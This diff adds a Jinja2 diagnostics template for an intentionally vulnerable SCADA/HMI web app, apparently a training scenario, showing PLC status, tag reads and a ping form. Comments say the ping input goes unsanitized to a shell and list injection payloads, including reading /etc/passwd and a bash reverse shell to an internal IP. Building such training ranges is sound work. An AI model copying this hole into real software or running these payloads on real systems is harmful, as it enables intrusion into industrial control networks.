@@ -1,0 +1,350 @@
+{# =============================================================================
+   diag.html — Internal Diagnostics Page  (/diag)
+   OT/ICS HMI Web Application — Legacy Build for Moxa UC-8220 / Debian 9
+
+   This page is intentionally not linked from the main dashboard.
+   It is designed to look like a legitimate internal maintenance tool.
+
+   CONTAINS: Unsanitized server-side ping utility (command injection vuln).
+
+   JINJA2 COMPATIBILITY: Uses Jinja2 2.11.x syntax. The `is not none` test
+   works identically in Jinja2 2.x and 3.x.
+   ============================================================================= #}
+{% extends "base.html" %}
+
+{% block title %}System Diagnostics{% endblock %}
+
+{% block extra_css %}
+<style>
+    /* Diagnostics page layout */
+    .diag-container {
+        padding: 1.2rem 1.5rem;
+        max-width: 960px;
+    }
+
+    .diag-section-title {
+        font-size: 0.7rem;
+        font-weight: 700;
+        text-transform: uppercase;
+        letter-spacing: 0.12em;
+        color: #505075;
+        border-bottom: 1px solid #2a2a4a;
+        padding-bottom: 0.3rem;
+        margin-bottom: 0.8rem;
+        margin-top: 1.5rem;
+    }
+    .diag-section-title:first-child { margin-top: 0; }
+
+    /* Key-value info grid */
+    .kv-grid {
+        display: grid;
+        grid-template-columns: 200px 1fr;
+        gap: 0.2rem 1rem;
+        font-size: 0.82rem;
+        margin-bottom: 0.5rem;
+    }
+    .kv-key {
+        color: #606080;
+        padding: 0.25rem 0;
+    }
+    .kv-val {
+        color: #c0c0d8;
+        padding: 0.25rem 0;
+        font-family: 'Courier New', monospace;
+    }
+    .kv-val.ok    { color: #00cc66; }
+    .kv-val.err   { color: #cc4400; }
+    .kv-val.warn  { color: #ffaa00; }
+
+    /* Tag error table */
+    .tag-table {
+        width: 100%;
+        border-collapse: collapse;
+        font-size: 0.8rem;
+        margin-bottom: 0.8rem;
+    }
+    .tag-table th {
+        text-align: left;
+        padding: 0.35rem 0.6rem;
+        background: #1a1a35;
+        color: #808098;
+        font-weight: 600;
+        text-transform: uppercase;
+        font-size: 0.68rem;
+        letter-spacing: 0.08em;
+        border-bottom: 1px solid #2a2a4a;
+    }
+    .tag-table td {
+        padding: 0.3rem 0.6rem;
+        border-bottom: 1px solid #1e1e38;
+        color: #b0b0c8;
+        font-family: 'Courier New', monospace;
+    }
+    .tag-table tr:hover td { background: #16163a; }
+    .tag-table .td-ok  { color: #00cc66; }
+    .tag-table .td-err { color: #cc4400; }
+
+    /* -----------------------------------------------------------------------
+       Ping utility form — styled to look like a standard network tool widget.
+       No visual indication that it is vulnerable (realistic training scenario).
+       ----------------------------------------------------------------------- */
+    .ping-tool {
+        background: #0e0e24;
+        border: 1px solid #2a2a4a;
+        border-radius: 4px;
+        padding: 1rem 1.2rem;
+        max-width: 600px;
+    }
+    .ping-tool label {
+        display: block;
+        font-size: 0.75rem;
+        color: #808098;
+        margin-bottom: 0.4rem;
+        text-transform: uppercase;
+        letter-spacing: 0.08em;
+    }
+    .ping-tool-row {
+        display: flex;
+        gap: 0.6rem;
+        align-items: stretch;
+    }
+    .ping-input {
+        flex: 1;
+        background: #16163a;
+        border: 1px solid #3a3a5a;
+        border-radius: 3px;
+        color: #d0d0e8;
+        font-family: 'Courier New', monospace;
+        font-size: 0.88rem;
+        padding: 0.4rem 0.7rem;
+        outline: none;
+        transition: border-color 0.2s;
+    }
+    .ping-input:focus { border-color: #00cc66; }
+    .ping-btn {
+        background: #1a3a2a;
+        border: 1px solid #00cc66;
+        border-radius: 3px;
+        color: #00cc66;
+        font-size: 0.82rem;
+        font-weight: 600;
+        padding: 0.4rem 1rem;
+        cursor: pointer;
+        letter-spacing: 0.06em;
+        text-transform: uppercase;
+        transition: background 0.2s;
+    }
+    .ping-btn:hover  { background: #1e4a30; }
+    .ping-btn:active { background: #0e2a18; }
+
+    .ping-hint {
+        font-size: 0.68rem;
+        color: #404060;
+        margin-top: 0.4rem;
+    }
+
+    /* Ping output terminal block */
+    .ping-output {
+        margin-top: 0.8rem;
+        background: #070712;
+        border: 1px solid #2a2a4a;
+        border-radius: 3px;
+        padding: 0.6rem 0.8rem;
+        font-family: 'Courier New', monospace;
+        font-size: 0.78rem;
+        color: #90f090;
+        white-space: pre-wrap;
+        word-break: break-all;
+        max-height: 300px;
+        overflow-y: auto;
+        line-height: 1.5;
+    }
+    .ping-output.has-error { color: #f09090; }
+    .ping-output-label {
+        font-size: 0.65rem;
+        color: #404060;
+        margin-bottom: 0.3rem;
+        text-transform: uppercase;
+        letter-spacing: 0.08em;
+    }
+
+    /* Connection status badge — large, prominent */
+    .conn-status-big {
+        display: inline-flex;
+        align-items: center;
+        gap: 0.5rem;
+        font-size: 0.9rem;
+        font-weight: 700;
+        padding: 0.35rem 0.8rem;
+        border-radius: 4px;
+        text-transform: uppercase;
+        letter-spacing: 0.08em;
+        margin-bottom: 0.5rem;
+    }
+    .conn-status-big.online  { background: #0a2a1a; color: #00cc66; border: 1px solid #00cc66; }
+    .conn-status-big.offline { background: #2a0a0a; color: #cc4400; border: 1px solid #cc4400; }
+    .conn-dot-big {
+        width: 10px; height: 10px;
+        border-radius: 50%;
+        display: inline-block;
+    }
+    .online  .conn-dot-big { background: #00cc66; box-shadow: 0 0 6px #00cc66; }
+    .offline .conn-dot-big { background: #cc4400; }
+</style>
+{% endblock %}
+
+
+{% block content %}
+<div class="diag-container">
+
+    {# ================================================================
+       Section 1 — PLC Connection Status
+       ================================================================ #}
+    <div class="diag-section-title">PLC Connection Status</div>
+
+    <div class="conn-status-big {{ 'online' if connected else 'offline' }}">
+        <span class="conn-dot-big"></span>
+        {{ 'CONNECTED' if connected else 'DISCONNECTED' }}
+    </div>
+
+    <div class="kv-grid">
+        <span class="kv-key">Controller IP</span>
+        <span class="kv-val">{{ plc_ip }}</span>
+
+        <span class="kv-key">Processor Slot</span>
+        <span class="kv-val">{{ plc_slot }}</span>
+
+        <span class="kv-key">Connection State</span>
+        <span class="kv-val {{ 'ok' if connected else 'err' }}">
+            {{ 'Online — EtherNet/IP session active' if connected else 'Offline — CIP session unavailable' }}
+        </span>
+
+        <span class="kv-key">Last Successful Poll</span>
+        <span class="kv-val {{ 'ok' if last_poll else 'warn' }}">
+            {{ last_poll if last_poll else 'Never' }}
+        </span>
+
+        <span class="kv-key">Poll Interval</span>
+        <span class="kv-val">{{ poll_interval }}s</span>
+
+        <span class="kv-key">Last Error</span>
+        <span class="kv-val {{ 'err' if last_error else 'ok' }}">
+            {{ last_error if last_error else 'None' }}
+        </span>
+
+        <span class="kv-key">Server Time (UTC)</span>
+        <span class="kv-val">{{ server_time }}</span>
+    </div>
+
+    {# ================================================================
+       Section 2 — Tag Read Status
+       ================================================================ #}
+    <div class="diag-section-title">Tag Read Status</div>
+
+    <table class="tag-table">
+        <thead>
+            <tr>
+                <th>Tag Name</th>
+                <th>Status</th>
+                <th>Notes</th>
+            </tr>
+        </thead>
+        <tbody>
+            {% for tag_name in ["Tank_Level", "Pump_Speed", "Pressure", "Temperature", "Flow_Rate", "Motor_RPM"] %}
+            <tr>
+                <td>{{ tag_name }}</td>
+                {% if tag_name in tag_errors %}
+                <td class="td-err">ERROR</td>
+                <td class="td-err">{{ tag_errors[tag_name] }}</td>
+                {% else %}
+                <td class="td-ok">OK</td>
+                <td>CIP Read_Tag successful</td>
+                {% endif %}
+            </tr>
+            {% endfor %}
+        </tbody>
+    </table>
+
+    {# ================================================================
+       Section 3 — Network Diagnostics (Ping Utility)
+
+       This section contains the intentionally vulnerable ping form.
+       The POST handler at /diag/ping executes the input as a shell
+       command with no sanitization.
+       ================================================================ #}
+    <div class="diag-section-title">Network Reachability Test</div>
+
+    <p style="font-size:0.78rem; color:#606080; margin-bottom:0.8rem;">
+        Use this utility to verify connectivity to devices on the OT network.
+        Enter a device IP address and click <strong style="color:#a0a0c0">Ping</strong> to test reachability.
+    </p>
+
+    <div class="ping-tool">
+        <form method="POST" action="/diag/ping" autocomplete="off">
+            <label for="ping-target">Target IP Address</label>
+            <div class="ping-tool-row">
+                {#
+                   VULNERABLE INPUT — passed directly to shell via subprocess.Popen
+                   No type="text" pattern restriction, no server-side validation.
+                   Example exploits:
+                     192.168.0.1; id
+                     192.168.0.1 && cat /etc/passwd
+                     192.168.0.1; bash -i >& /dev/tcp/192.168.1.99/4444 0>&1
+                #}
+                <input
+                    type="text"
+                    id="ping-target"
+                    name="target"
+                    class="ping-input"
+                    placeholder="e.g. 192.168.0.10"
+                    value="{{ ping_target if ping_target else '' }}"
+                    maxlength="256"
+                    spellcheck="false"
+                    autocorrect="off"
+                    autocapitalize="off"
+                >
+                <button type="submit" class="ping-btn">Ping</button>
+            </div>
+            <div class="ping-hint">
+                Tests ICMP reachability to the specified host. Timeout: 2s per packet, 2 packets.
+            </div>
+        </form>
+
+        {# Show ping output if a result is available (i.e., after form submission) #}
+        {% if ping_result is not none %}
+        <div>
+            <div class="ping-output-label">
+                Output — {{ ping_target }}
+            </div>
+            <div class="ping-output {{ 'has-error' if ping_error else '' }}">{{ ping_result }}</div>
+        </div>
+        {% endif %}
+    </div>
+
+    {# ================================================================
+       Section 4 — System Information
+       ================================================================ #}
+    <div class="diag-section-title">System Information</div>
+
+    <div class="kv-grid">
+        <span class="kv-key">Application Version</span>
+        <span class="kv-val">SCADA HMI v2.3.1-legacy</span>
+
+        <span class="kv-key">Backend Framework</span>
+        <span class="kv-val">Flask 1.1.4 / Python 3.5</span>
+
+        <span class="kv-key">PLC Driver</span>
+        <span class="kv-val">pylogix 0.8.13 (EtherNet/IP)</span>
+
+        <span class="kv-key">Protocol</span>
+        <span class="kv-val">EtherNet/IP — CIP Read_Tag (explicit messaging)</span>
+
+        <span class="kv-key">Host Network Interfaces</span>
+        <span class="kv-val">eth0 (IT/web), eth1 (OT/PLC)</span>
+
+        <span class="kv-key">Platform</span>
+        <span class="kv-val">Moxa UC-8220 / Debian 9 (Stretch)</span>
+    </div>
+
+</div>
+{% endblock %}
